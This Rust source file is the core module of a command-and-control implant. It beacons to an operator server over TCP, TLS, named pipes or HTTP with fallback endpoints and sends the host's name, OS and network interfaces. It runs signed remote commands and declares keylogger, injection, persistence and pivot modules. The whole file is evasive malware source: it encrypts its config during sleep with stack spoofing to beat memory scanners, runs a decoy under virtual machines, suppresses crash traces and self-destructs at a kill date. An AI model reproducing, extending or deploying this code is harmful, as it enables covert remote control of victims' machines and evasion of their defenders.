// src/agent/mod.rs
pub mod config;
pub mod handlers;
pub mod scripting;
pub mod pivot;
pub mod injection;
pub mod keylogger;
pub mod evasion;
pub mod jobs;
pub mod inmem;
pub mod migrate;
pub mod artifacts;
pub mod persistence;
pub mod http_transport;
pub mod fallback;
pub mod syscalls;
pub mod hibernation;
pub mod dga;

use tokio::sync::mpsc;
use std::sync::{Arc, Mutex};
use ed25519_dalek::{VerifyingKey, Signature, Verifier};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use rand::{Rng, RngCore};
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce
};
use rand::rngs::OsRng;
use zeroize::Zeroize;

use crate::common::{ClientHello, SecuredCommand, PivotFrame, C2Config, MalleableProfile};
use crate::utils;
use crate::transport::ClientTransport;
use crate::lc;
use crate::traffic::DataMolder;

use self::handlers::{HandlerContext, AgentAction};
use self::scripting::ExtensionManager;
use self::pivot::PivotManager;
use self::jobs::JobManager;

// Enhanced Sleep Mask: encrypts config + process heap, uses fiber-based
// stack spoofing so the agent's call stack is clean during sleep.
async fn sleep_with_mask(config: C2Config, duration: std::time::Duration) -> C2Config {
    let config_bytes = serde_json::to_vec(&config).unwrap_or_default();
    
    // Perform all cryptographic operations inside spawn_blocking so key material
    // lives on a dedicated thread stack, not the tokio executor's stack/heap
    // where it persists across await points and is visible to memory scanners.
    let sleep_ms = duration.as_millis() as u32;
    
    let result = tokio::task::spawn_blocking(move || {
        // 1. Generate keys and encrypt config — all on this thread's stack
        let mut key = [0u8; 32];
        let mut nonce_bytes = [0u8; 12];
        OsRng.fill_bytes(&mut key);
        OsRng.fill_bytes(&mut nonce_bytes);
        
        let aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key);
        let cipher = Aes256Gcm::new(aes_key);
        let nonce = Nonce::from_slice(&nonce_bytes);
        
        let ciphertext = match cipher.encrypt(nonce, config_bytes.as_ref()) {
            Ok(ct) => ct,
            Err(_) => {
                // Encryption failed — plain sleep, return config bytes as-is
                evasion::sleep_with_spoofed_stack(sleep_ms);
                return config_bytes;
            }
        };
        
        // Zeroize the plaintext config bytes IMMEDIATELY after encryption.
        // Without this, serde's serialized JSON (containing C2 hosts, keys,
        // etc.) sits in freed heap memory during the entire sleep phase,
        // completely visible to memory scanners. The config is safely stored
        // in `ciphertext` now — we don't need the plaintext anymore.
        let mut config_bytes = config_bytes; // rebind as mut for zeroize
        config_bytes.zeroize();
        
        // Drop the cipher BEFORE sleeping. The Aes256Gcm struct contains the
        // expanded AES key schedule (240 bytes of derived round keys) on the
        // stack. If it's still alive during sleep, a memory scanner walking
        // the thread's stack will find the key material and decrypt the config.
        drop(cipher);
        
        // 2. Sleep with stack spoofing.
        //
        // DESIGN NOTE: We intentionally do NOT suspend threads or encrypt
        // the process heap here. The agent runs on a multi-threaded Tokio
        // runtime whose worker threads service I/O completions, timers, and
        // the task scheduler. Suspending them (even briefly) can deadlock
        // the runtime if a worker holds an internal scheduler lock, and
        // breaks active pivot listeners, proxy tunnels, and HTTP polling.
        //
        // The config is already AES-256-GCM encrypted above, which protects
        // the most sensitive data (C2 host, keys, build ID) from memory
        // scanners during sleep. Full heap encryption is only safe in a
        // single-threaded synchronous agent — not applicable here.
        evasion::sleep_with_spoofed_stack(sleep_ms);
        
        // 3. Decrypt config
        let aes_key_decrypt = aes_gcm::Key::<Aes256Gcm>::from_slice(&key);
        let cipher_decrypt = Aes256Gcm::new(aes_key_decrypt);
        
        let decrypted = cipher_decrypt.decrypt(nonce, ciphertext.as_ref());
        // Drop cipher before zeroing its key source
        drop(cipher_decrypt);

        let result = match decrypted {
            Ok(plaintext) => plaintext,
            // config_bytes was zeroized after encryption — can't use as fallback.
            // Return empty vec; the outer code falls back to config_backup.
            Err(_) => Vec::new(),
        };
        
        // Zero key material using zeroize crate — guarantees the compiler
        // won't optimize out the zeroing. Handles underlying memory copies
        // that write_volatile would miss (inside cipher structs, stack padding, etc.)
        key.zeroize();
        nonce_bytes.zeroize();
        
        result
    }).await.unwrap_or_else(|_| serde_json::to_vec(&config).unwrap_or_default());

    let mut config_backup = serde_json::to_vec(&config).unwrap_or_default();

    // Zero the original config's sensitive heap-allocated fields. When the
    // allocator frees these Strings, the backing memory goes to the free list.
    // Without zeroing, plaintext C2 hostnames, keys, and salts persist in freed
    // heap blocks indefinitely, completely defeating the heap encryption above.
    let mut config = config; // rebind as mutable to zeroize fields
    config.c2_host.zeroize();
    config.server_public_key.zeroize();
    config.hash_salt.zeroize();
    config.build_id.zeroize();
    config.profile.user_agent.zeroize();
    for ep in &mut config.fallback.endpoints {
        ep.host.zeroize();
    }
    drop(config);

    // Zero the plaintext result bytes after deserialization — the decrypted
    // config would otherwise persist on the freed heap indefinitely, rendering
    // the AES encryption during sleep useless against a memory dump.
    let mut result_buf = result;
    let parsed_config = serde_json::from_slice(&result_buf).unwrap_or_else(|_| {
        serde_json::from_slice(&config_backup).unwrap_or_else(|_| crate::agent::config::load())
    });
    result_buf.zeroize();
    config_backup.zeroize();
    parsed_config
}

pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
    // [OPSEC] Panic suppression — no stack traces to disk or stderr.
    // Instead of completely swallowing panics (which makes logic bugs
    // impossible to diagnose), capture the last panic message in a static
    // buffer that can be queried by the C2 operator for diagnostics.
    std::panic::set_hook(Box::new(|info| {
        use std::sync::OnceLock;
        static LAST_PANIC: OnceLock<std::sync::Mutex<String>> = OnceLock::new();
        let buf = LAST_PANIC.get_or_init(|| std::sync::Mutex::new(String::new()));
        if let Ok(mut s) = buf.lock() {
            *s = format!("{}", info);
            // Truncate to prevent memory bloat from large panic payloads
            s.truncate(512);
        }
    }));

    let mut config = config::load();

    // Check Kill Date Immediately
    if let Some(kill_ts) = config.kill_date {
        let now = chrono::Utc::now().timestamp();
        if now > kill_ts {
            utils::self_destruct();
        }
    }

    if !config.debug {
        // UPDATE PATH HERE: self::evasion or just evasion
        if evasion::is_virtualized() { evasion::run_decoy(); }
    }

    let hwid = utils::get_persistent_id();
    let exe_id = utils::generate_exe_id(&config.hash_salt);
    
    let mut base_sleep = config.sleep_interval;
    let mut base_jitter_min = config.jitter_min;
    let mut base_jitter_max = config.jitter_max;
    
    let mut is_active_mode = false;
    
    let proxy_handle = Arc::new(Mutex::new(None));
    let rportfwd_handles = Arc::new(Mutex::new(Vec::new()));
    let ext_manager = Arc::new(Mutex::new(ExtensionManager::new()));

    // [NEW] Initialize Keylogger Buffer (required for background thread)
    let _ = keylogger::init_buffer();

    let server_pub = BASE64.decode(&config.server_public_key)?;
    let pub_bytes: [u8; 32] = server_pub.try_into()
        .map_err(|_| "Invalid server public key length (expected 32 bytes)")?;
    let verify_key = VerifyingKey::from_bytes(&pub_bytes)?;

    if config.debug {
        println!("[*] Client Started. ID: {}", hwid);
    }

    // ── Hibernation mode dispatch ──────────────────────────────────────
    if config.hibernation_mode {
        return hibernation::run_hibernation(config, hwid, exe_id, verify_key).await;
    }

    // ── HTTP(S) Transport Mode ─────────────────────────────────────────
    if config.transport == crate::common::TransportProtocol::Http
        || config.transport == crate::common::TransportProtocol::Https
    {
        return run_http_mode(
            config, hwid, exe_id, verify_key,
            proxy_handle, rportfwd_handles, ext_manager,
        ).await;
    }

    // ── TCP/TLS/Pipe Transport Mode ────────────────────────────────────
    let mut fb_mgr = fallback::FallbackManager::from_config(&config);
    let mut connect_failures: u32 = 0;
    loop {
        // Select endpoint from fallback manager
        let resolved = match fb_mgr.next_endpoint(&config) {
            Some(ep) => ep,
            None => {
                tokio::time::sleep(std::time::Duration::from_secs(10)).await;
                continue;
            }
        };
        let ep_index = resolved.index;

        // Build a temporary config for this endpoint
        let mut ep_config = config.clone();
        ep_config.c2_host = resolved.host.clone();
        ep_config.tunnel_port = resolved.port;
        ep_config.transport = resolved.transport.clone();
        ep_config.profile = resolved.profile.clone();
        ep_config.proxy = resolved.proxy.clone();

        if config.debug {
            eprintln!("[*] Trying endpoint: {}:{} ({:?})", resolved.host, resolved.port, resolved.transport);
        }

        let transport = ClientTransport::new(&ep_config);
        let stream_result = transport.connect().await;

        if let Err(ref e) = stream_result {
            fb_mgr.record_failure(ep_index);
            if config.debug {
                eprintln!("[-] Connection Failed ({}:{}): {}", resolved.host, resolved.port, e);
            }
            let base_delay = std::cmp::min(5u64 * 2u64.saturating_pow(connect_failures), 300);
            let jitter = rand::thread_rng().gen_range(0..=base_delay / 2);
            let delay = base_delay + jitter;
            connect_failures = connect_failures.saturating_add(1);
            tokio::time::sleep(std::time::Duration::from_secs(delay)).await;
            continue;
        }
        fb_mgr.record_success(ep_index);
        connect_failures = 0;

        if let Ok(stream) = stream_result {
            let (mut reader, mut writer) = tokio::io::split(stream);
            let (tx, mut rx) = mpsc::channel::<Vec<u8>>(100);
            let (cmd_tx, mut cmd_rx) = mpsc::channel::<SecuredCommand>(100);

            let pivot_mgr = Arc::new(tokio::sync::Mutex::new(PivotManager::new(tx.clone())));
            let job_mgr = Arc::new(Mutex::new(JobManager::new(tx.clone())));

            // 1. Writer Task (Handshake Logic)
            let active_profile_tx = config.profile.clone();
            let handshake_profile = MalleableProfile::default();

            tokio::spawn(async move {
                let mut handshake_sent = false;

                while let Some(data) = rx.recv().await {
                    let profile_to_use = if !handshake_sent {
                        &handshake_profile
                    } else {
                        &active_profile_tx
                    };

                    if DataMolder::send(&mut writer, &data, profile_to_use).await.is_err() { 
                        break; 
                    }
                    handshake_sent = true;
                }
            });

            // 2. Handshake Payload
            let reg_ts = chrono::Utc::now().to_rfc3339();
            let auth_hmac = compute_auth_hmac(&config.challenge_key, &config.build_id, &exe_id, &reg_ts);
            let hello = ClientHello {
                hostname: hostname::get().unwrap_or(lc!("unknown").into()).to_string_lossy().into(),
                os: std::env::consts::OS.to_string(),
                computer_id: hwid.clone(),
                exe_id: exe_id.clone(),
                build_id: config.build_id.clone(),
                auth_hmac,
                reg_timestamp: reg_ts,
                interfaces: crate::utils::get_network_interfaces(),
                hibernation_mode: false,
                task_batch_size: config.task_batch_size,
            };
            if let Ok(j) = serde_json::to_vec(&hello) { let _ = tx.send(j).await; }

            // 2b. Handle challenge-response if challenge_key is configured
            if !config.challenge_key.is_empty() {
                // Small delay to let the writer task flush the hello
                tokio::time::sleep(std::time::Duration::from_millis(100)).await;

                // Read next message from server. Could be a challenge (new server)
                // or a regular command (old server without challenge support).
                let handshake_profile = crate::common::MalleableProfile::default();
                let first_msg = match DataMolder::recv(&mut reader, &handshake_profile).await {
                    Ok(b) => b,
                    Err(_) => {
                        if config.debug { eprintln!("[-] Failed to receive from server"); }
                        continue;
                    }
                };

                // Try to parse as a challenge
                if let Ok(challenge) = serde_json::from_slice::<crate::common::HandshakeChallenge>(&first_msg) {
                    // Verify server's ed25519 signature
                    let sig_bytes = match BASE64.decode(&challenge.server_proof) {
                        Ok(b) => b,
                        Err(_) => { continue; }
                    };
                    let sig_arr: [u8; 64] = match sig_bytes.try_into() {
                        Ok(a) => a,
                        Err(_) => { continue; }
                    };
                    let sig = ed25519_dalek::Signature::from_bytes(&sig_arr);
                    if verify_key.verify(challenge.nonce.as_bytes(), &sig).is_err() {
                        if config.debug { eprintln!("[-] Server proof failed — aborting"); }
                        continue;
                    }

                    // Server verified — compute HMAC response
                    let key_bytes = match BASE64.decode(&config.challenge_key) {
                        Ok(b) => b,
                        Err(_) => { continue; }
                    };

                    use hmac::{Hmac, Mac};
                    use sha2::Sha256;
                    type HmacSha256 = Hmac<Sha256>;

                    let mut mac = match <HmacSha256 as Mac>::new_from_slice(&key_bytes) {
                        Ok(m) => m,
                        Err(_) => { continue; }
                    };
                    mac.update(challenge.nonce.as_bytes());
                    mac.update(config.build_id.as_bytes());
                    let result = BASE64.encode(mac.finalize().into_bytes());

                    let response = crate::common::HandshakeResponse { hmac: result };
                    if let Ok(resp_data) = serde_json::to_vec(&response) {
                        let _ = tx.send(resp_data).await;
                        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
                    }
                }
                // If it's not a challenge (old server), the data is a command.
                // It will be lost since we already consumed it from the stream.
                // This is acceptable: the first command on an old server is typically
                // an auto-recon that will be re-sent on the next check-in cycle.
            }

            // 3. Reader Task
            let active_profile_rx = config.profile.clone();
            let pivot_mgr_clone = pivot_mgr.clone();
            
            tokio::spawn(async move {
                loop {
                    let buf = match DataMolder::recv(&mut reader, &active_profile_rx).await {
                        Ok(b) => b,
                        Err(_) => break,
                    };

                    if let Ok(frame) = serde_json::from_slice::<PivotFrame>(&buf) {
                        pivot_mgr_clone.lock().await.handle_downstream_frame(frame);
                        continue;
                    }

                    if let Ok(msg) = serde_json::from_slice::<SecuredCommand>(&buf) {
                        if cmd_tx.send(msg).await.is_err() { break; }
                    }
                }
            });

            // 4. Main Executor
            let mut last_counter = 0u64;
            while let Some(msg) = cmd_rx.recv().await {
                if msg.counter <= last_counter { continue; }
                
                let sign_bytes = msg.get_signable_bytes();
                let sig_bytes = BASE64.decode(&msg.signature).unwrap_or_default();
                let sig_arr: [u8; 64] = sig_bytes.try_into().unwrap_or([0u8; 64]);
                let sig = Signature::from_bytes(&sig_arr);

                if verify_key.verify(&sign_bytes, &sig).is_ok() {
                    last_counter = msg.counter;
                    if msg.command == lc!("exit") { return Ok(()); }

                    let ctx = HandlerContext {
                        proxy_handle: proxy_handle.clone(),
                        rportfwd_handles: rportfwd_handles.clone(),
                        ext_manager: ext_manager.clone(),
                        job_manager: job_mgr.clone(),
                        c2_host: ep_config.c2_host.clone(),
                        tx: tx.clone(),
                        pivot_mgr: pivot_mgr.clone(),
                    };

                    match handlers::dispatch(&ctx, msg).await {
                        AgentAction::UpdateConfig(s, min, max) => {
                            base_sleep = s;
                            base_jitter_min = min;
                            base_jitter_max = max;
                        },
                        AgentAction::SetMode(active) => {
                            is_active_mode = active;
                        },
                        AgentAction::None => {}
                    }

                    if is_active_mode {
                        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
                    } 
                }
            }
        } 

        // 5. Sleep with Memory Encryption (Passive Mode)
        if !is_active_mode {
            let base_ms = if base_sleep > 0 { base_sleep * 1000 } else { 5000 };
            let safe_min = base_jitter_min;
            let safe_max = if base_jitter_max < safe_min { safe_min } else { base_jitter_max };

            let jitter_ms = if safe_max > 0 {
                rand::thread_rng().gen_range(safe_min..=safe_max) as u64
            } else { 0 };
            
            let sleep_duration = std::time::Duration::from_millis(base_ms + jitter_ms);

            config = sleep_with_mask(config, sleep_duration).await;
        } else {
            tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
        }

        // Check Kill Date on Wake
        if let Some(kill_ts) = config.kill_date {
            if chrono::Utc::now().timestamp() > kill_ts {
                utils::self_destruct();
            }
        }
    }
}

/// HTTP(S) transport main loop. Uses polling instead of persistent connections.
async fn run_http_mode(
    config: crate::common::C2Config,
    hwid: String,
    exe_id: String,
    verify_key: VerifyingKey,
    proxy_handle: Arc<Mutex<Option<tokio::task::AbortHandle>>>,
    rportfwd_handles: Arc<Mutex<Vec<handlers::RportfwdHandle>>>,
    ext_manager: Arc<Mutex<ExtensionManager>>,
) -> Result<(), Box<dyn std::error::Error>> {
    use crate::common::CommandResponse;

    let reg_ts = chrono::Utc::now().to_rfc3339();
    let auth_hmac = compute_auth_hmac(&config.challenge_key, &config.build_id, &exe_id, &reg_ts);
    let hello = ClientHello {
        hostname: hostname::get().unwrap_or(lc!("unknown").into()).to_string_lossy().into(),
        os: std::env::consts::OS.to_string(),
        computer_id: hwid.clone(),
        exe_id: exe_id.clone(),
        build_id: config.build_id.clone(),
        auth_hmac,
        reg_timestamp: reg_ts,
        interfaces: crate::utils::get_network_interfaces(),
        hibernation_mode: false,
        task_batch_size: config.task_batch_size,
    };

    let mut fb_mgr = fallback::FallbackManager::from_config(&config);

    // Registration with fallback retry
    let (client, base, token, initial_cmds, active_host) = loop {
        let resolved = match fb_mgr.next_endpoint(&config) {
            Some(ep) => ep,
            None => {
                tokio::time::sleep(std::time::Duration::from_secs(10)).await;
                continue;
            }
        };
        let ep_idx = resolved.index;

        let mut ep_config = config.clone();
        ep_config.c2_host = resolved.host.clone();
        ep_config.tunnel_port = resolved.port;
        ep_config.proxy = resolved.proxy.clone();

        if config.debug { eprintln!("[*] HTTP: trying {}:{}", resolved.host, resolved.port); }

        let c = match http_transport::build_client(&ep_config) {
            Ok(c) => c,
            Err(e) => {
                fb_mgr.record_failure(ep_idx);
                if config.debug { eprintln!("[-] Client build failed: {}", e); }
                tokio::time::sleep(std::time::Duration::from_secs(5)).await;
                continue;
            }
        };
        let b = http_transport::base_url(&ep_config);

        match http_transport::register(&c, &b, &hello).await {
            Ok((tok, cmds)) => {
                fb_mgr.record_success(ep_idx);
                break (c, b, tok, cmds, ep_config.c2_host.clone());
            }
            Err(e) => {
                fb_mgr.record_failure(ep_idx);
                if config.debug { eprintln!("[-] HTTP register failed ({}:{}): {}", resolved.host, resolved.port, e); }
                tokio::time::sleep(std::time::Duration::from_secs(10)).await;
            }
        }
    };

    if config.debug { println!("[+] HTTP registered at {}", base); }

    // Channel for outbound results (handlers send via tx, we POST them)
    let (tx, mut rx) = tokio::sync::mpsc::channel::<Vec<u8>>(100);
    let pivot_mgr = Arc::new(tokio::sync::Mutex::new(PivotManager::new(tx.clone())));
    let job_mgr = Arc::new(Mutex::new(JobManager::new(tx.clone())));

    let poll_uri = config.profile.http_get.uris.first()
        .cloned().unwrap_or_else(|| "/api/v1/sync".to_string());
    let post_uri = config.profile.http_post.uris.first()
        .cloned().unwrap_or_else(|| "/api/v1/sync".to_string());

    let mut base_sleep = config.sleep_interval;
    let mut base_jitter_min = config.jitter_min;
    let mut base_jitter_max = config.jitter_max;
    let mut last_counter = 0u64;

    // Process initial commands from registration
    for cmd in initial_cmds {
        process_http_command(
            &cmd, &verify_key, &mut last_counter,
            &proxy_handle, &rportfwd_handles, &ext_manager, &job_mgr,
            &active_host, &tx, &pivot_mgr,
        ).await;
    }

    // Main polling loop
    loop {
        // 1. Send any pending results
        while let Ok(data) = rx.try_recv() {
            if let Ok(resp) = serde_json::from_slice::<CommandResponse>(&data) {
                let _ = http_transport::send_result(&client, &base, &token, &resp, &post_uri).await;
            }
        }

        // 2. Poll for new commands
        match http_transport::poll(&client, &base, &token, &poll_uri).await {
            Ok(commands) => {
                for cmd in commands {
                    let action = process_http_command(
                        &cmd, &verify_key, &mut last_counter,
                        &proxy_handle, &rportfwd_handles, &ext_manager, &job_mgr,
                        &active_host, &tx, &pivot_mgr,
                    ).await;

                    match action {
                        handlers::AgentAction::UpdateConfig(s, min, max) => {
                            base_sleep = s; base_jitter_min = min; base_jitter_max = max;
                        }
                        handlers::AgentAction::SetMode(_) => {} // No beacon mode in HTTP
                        handlers::AgentAction::None => {}
                    }
                }
            }
            Err(e) => {
                if config.debug { eprintln!("[-] Poll error: {}", e); }
            }
        }

        // 3. Flush any results generated by command processing
        while let Ok(data) = rx.try_recv() {
            if let Ok(resp) = serde_json::from_slice::<CommandResponse>(&data) {
                let _ = http_transport::send_result(&client, &base, &token, &resp, &post_uri).await;
            }
        }

        // 4. Sleep with jitter
        let base_ms = if base_sleep > 0 { base_sleep * 1000 } else { 5000 };
        let jitter_ms = if base_jitter_max > 0 {
            rand::thread_rng().gen_range(base_jitter_min..=base_jitter_max.max(base_jitter_min)) as u64
        } else { 0 };
        tokio::time::sleep(std::time::Duration::from_millis(base_ms + jitter_ms)).await;

        // 5. Check kill date
        if let Some(kill_ts) = config.kill_date {
            if chrono::Utc::now().timestamp() > kill_ts {
                utils::self_destruct();
            }
        }
    }
}

/// Process a single command in HTTP mode.
async fn process_http_command(
    cmd: &SecuredCommand,
    verify_key: &VerifyingKey,
    last_counter: &mut u64,
    proxy_handle: &Arc<Mutex<Option<tokio::task::AbortHandle>>>,
    rportfwd_handles: &Arc<Mutex<Vec<handlers::RportfwdHandle>>>,
    ext_manager: &Arc<Mutex<ExtensionManager>>,
    job_mgr: &Arc<Mutex<JobManager>>,
    c2_host: &str,
    tx: &tokio::sync::mpsc::Sender<Vec<u8>>,
    pivot_mgr: &Arc<tokio::sync::Mutex<PivotManager>>,
) -> handlers::AgentAction {
    if cmd.counter <= *last_counter { return handlers::AgentAction::None; }

    let sign_bytes = cmd.get_signable_bytes();
    let sig_bytes = BASE64.decode(&cmd.signature).unwrap_or_default();
    let sig_arr: [u8; 64] = sig_bytes.try_into().unwrap_or([0u8; 64]);
    let sig = ed25519_dalek::Signature::from_bytes(&sig_arr);

    if verify_key.verify(&sign_bytes, &sig).is_err() {
        return handlers::AgentAction::None;
    }

    *last_counter = cmd.counter;

    if cmd.command == lc!("exit") {
        std::process::exit(0);
    }

    let ctx = handlers::HandlerContext {
        proxy_handle: proxy_handle.clone(),
        rportfwd_handles: rportfwd_handles.clone(),
        ext_manager: ext_manager.clone(),
        job_manager: job_mgr.clone(),
        c2_host: c2_host.to_string(),
        tx: tx.clone(),
        pivot_mgr: pivot_mgr.clone(),
    };

    // Create an owned SecuredCommand for dispatch
    let owned_cmd = SecuredCommand {
        session_id: cmd.session_id.clone(),
        counter: cmd.counter,
        nonce: cmd.nonce,
        timestamp: cmd.timestamp,
        command: cmd.command.clone(),
        signature: cmd.signature.clone(),
    };

    handlers::dispatch(&ctx, owned_cmd).await
}

/// Compute HMAC-SHA256(challenge_key, build_id || exe_id) for ClientHello authentication.
/// Returns empty string if challenge_key is not configured (backward compatible).
fn compute_auth_hmac(challenge_key_b64: &str, build_id: &str, exe_id: &str, timestamp: &str) -> String {
    if challenge_key_b64.is_empty() {
        return String::new();
    }
    let key_bytes = match BASE64.decode(challenge_key_b64) {
        Ok(b) => b,
        Err(_) => return String::new(),
    };
    use hmac::{Hmac, Mac};
    use sha2::Sha256;
    type HmacSha256 = Hmac<Sha256>;
    match <HmacSha256 as Mac>::new_from_slice(&key_bytes) {
        Ok(mut mac) => {
            // Length-prefix each field to prevent concatenation collisions
            mac.update(&(build_id.len() as u32).to_le_bytes());
            mac.update(build_id.as_bytes());
            mac.update(&(exe_id.len() as u32).to_le_bytes());
            mac.update(exe_id.as_bytes());
            mac.update(&(timestamp.len() as u32).to_le_bytes());
            mac.update(timestamp.as_bytes());
            BASE64.encode(mac.finalize().into_bytes())
        }
        Err(_) => String::new(),
    }
}
